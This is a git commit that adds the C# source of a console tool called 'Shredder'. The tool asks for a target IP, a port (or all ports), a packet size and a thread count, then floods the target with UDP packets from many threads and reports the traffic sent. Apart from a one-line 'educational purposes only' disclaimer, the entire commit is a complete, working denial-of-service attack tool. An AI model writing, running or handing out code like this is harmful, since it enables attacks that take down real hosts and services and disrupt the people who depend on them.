d15dfb07121119f5376981adda4142f484eb3ce4
Tom Schmitz <tom.schmitz16@gmail.com>
2023-07-31 22:30:19 +0200

    Projektdateien hinzufügen.

---
+++ Program.cs
@@ -0,0 +1,119 @@
+﻿/*!-----------------------------------------------------------------------------
+ * For educational purposes only
+ * Attacking system without consent is illegal
+ *-----------------------------------------------------------------------------*/
+
+
+using System.Net;
+
+namespace Shredder
+{
+    public class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("Enter the IP to Shred:");
+            string ip = GetUserInput();
+            Console.WriteLine();
+
+            while (!IsValidIpAddress(ip))
+            {
+                Console.WriteLine("Error! Please enter a correct IP address:");
+                ip = GetUserInput();
+            }
+
+            Console.WriteLine("Enter port (press enter to attack all ports):");
+            string portInput = GetUserInput();
+            int port = 0;
+
+            if (!string.IsNullOrWhiteSpace(portInput))
+            {
+                while (!int.TryParse(portInput, out port) || port < 1 || port > 65535)
+                {
+                    Console.WriteLine("Error! Please enter a correct port:");
+                    portInput = GetUserInput();
+                }
+            }
+
+            Console.WriteLine("Bytes per packet (press enter for 1250):");
+            string forceInput = GetUserInput();
+            int force = string.IsNullOrWhiteSpace(forceInput) ? 1250 : 0;
+
+            if (force == 0)
+            {
+                while (!int.TryParse(forceInput, out force))
+                {
+                    Console.WriteLine("Error! Please enter an integer for bytes per packet:");
+                    forceInput = GetUserInput();
+                }
+            }
+
+            Console.WriteLine("Threads (press enter for 100):");
+            string threadsInput = GetUserInput();
+            int threads = string.IsNullOrWhiteSpace(threadsInput) ? 100 : 0;
+
+            if (threads == 0)
+            {
+                while (!int.TryParse(threadsInput, out threads))
+                {
+                    Console.WriteLine("Error! Please enter an integer for threads:");
+                    threadsInput = GetUserInput();
+                }
+            }
+
+            Console.WriteLine($"Starting attack on {ip}:{port}.");
+            Console.Write($"{"",10}");
+
+            Shred shred = new Shred(ip, port, force, threads);
+
+            try
+            {
+                shred.Flood();
+            }
+            catch
+            {
+                shred.Stop();
+                Error("A fatal error has occurred and the attack was stopped.");
+            }
+
+            try
+            {
+                while (true)
+                {
+                    Thread.Sleep(1000000);
+                }
+            }
+            catch (ThreadInterruptedException)
+            {
+                shred.Stop();
+                Console.WriteLine($"Attack stopped. {ip}:{port} was shredded with {Math.Round(shred.Total, 1)} Gb.");
+            }
+
+            Console.WriteLine();
+            Thread.Sleep(1000);
+
+            Console.WriteLine("Press enter to exit.");
+            Console.ReadLine();
+        }
+
+        private static string GetUserInput()
+        {
+            Console.ForegroundColor = ConsoleColor.Cyan;
+            string input = Console.ReadLine();
+            Console.ResetColor();
+            return input;
+        }
+
+        private static bool IsValidIpAddress(string ipAddress)
+        {
+            return IPAddress.TryParse(ipAddress, out _);
+        }
+
+        private static void Error(string text)
+        {
+            Console.ForegroundColor = ConsoleColor.Red;
+            Console.WriteLine($"\n! {text}");
+            Console.ResetColor();
+        }
+    }
+}
---
+++ Shred.cs
@@ -0,0 +1,129 @@
+﻿using System.Net;
+using System.Net.Sockets;
+
+namespace Shredder
+{
+    public class Shred
+    {
+        private string _ip;
+        private int _port;
+        private int _force; // default: 1250
+        private int _threads; // default: 100
+
+        private UdpClient _client;
+        private byte[] _data;
+        private int _len;
+
+        private bool _on;
+        private long _sent;
+        private double _total;
+        public double Total { get { return _total; } }
+
+        public Shred(string ip, int port, int force, int threads)
+        {
+            this._ip = ip;
+            this._port = port;
+            this._force = force; // default: 1250
+            this._threads = threads; // default: 100
+
+            _client = new UdpClient();
+            _data = new byte[force];
+            _len = _data.Length;
+        }
+
+        public void Flood()
+        {
+            _on = true;
+            _sent = 0;
+            for (int i = 0; i < _threads; i++)
+            {
+                new Thread(Send).Start();
+            }
+            new Thread(Info).Start();
+        }
+
+        public void Info()
+        {
+            double interval = 0.05;
+            double now = GetTime();
+
+            int size = 0;
+            _total = 0;
+
+            int bytediff = 8;
+            double mb = 1000000;
+            double gb = 1000000000;
+
+            while (_on)
+            {
+                Thread.Sleep((int)(interval * 1000));
+                if (!_on)
+                {
+                    break;
+                }
+
+                if (size != 0)
+                {
+                    _total += _sent * bytediff / gb * interval;
+                    Console.Write($"\r{Stage($"{(int)Math.Round(Convert.ToDecimal(size))} Mb/s - Total: {Math.Round(_total, 1)} Gb.")}");
+                }
+
+                double now2 = GetTime();
+
+                if (now + 1 >= now2)
+                {
+                    continue;
+                }
+
+                size = (int)Math.Round(_sent * bytediff / mb);
+                _sent = 0;
+
+                now += 1;
+            }
+        }
+
+
+        private string Stage(string text, char symbol = '.')
+        {
+            return $" {symbol} {text}";
+        }
+
+
+        public void Stop()
+        {
+            _on = false;
+        }
+
+        public void Send()
+        {
+            while (_on)
+            {
+                try
+                {
+                    IPEndPoint endPoint = (IPEndPoint)GetEndpoint();
+                    _client.Send(_data, _data.Length, endPoint);
+                    _sent += _len;
+                }
+                catch
+                {
+                    // ignore
+                }
+            }
+        }
+
+        private EndPoint GetEndpoint()
+        {
+            return new IPEndPoint(IPAddress.Parse(_ip), GetPort());
+        }
+
+        private int GetPort()
+        {
+            return _port == 0 ? new Random().Next(1, 65536) : _port;
+        }
+
+        private static double GetTime()
+        {
+            return (double)DateTime.UtcNow.Ticks / TimeSpan.TicksPerSecond;
+        }
+    }
+}
